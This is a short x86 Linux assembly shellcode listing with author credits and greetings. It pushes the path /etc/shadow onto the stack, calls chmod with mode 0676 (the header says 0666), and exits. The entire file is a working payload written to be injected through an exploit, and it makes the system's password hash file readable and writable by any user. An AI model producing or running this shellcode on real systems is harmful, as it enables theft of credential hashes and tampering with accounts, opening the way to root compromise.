; linux/x86 ; chmod(/etc/shadow, 0666) & exit() 33 bytes
; written by ka0x - <ka0x01[alt+64]gmail.com>
; lun sep 21 17:13:25 CEST 2009
; 
; greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!
;
; Polymorphed by Re4son: 31 bytes
; re4son [at] whitedome.com.au

global _start           

section .text

_start: 
  cdq			; clear edx
  push edx		; push NULL termination
  push dword 0x776f6461 ; push adow 
  push dword 0x68732f63 ; push hs/c
  push dword 0x74652f2f ; push te//
  mov ebx,esp
  mov al,0xf
  mov cx,0x1be		; chmod 676
  int 0x80
  mov al,0x1
  int 0x80

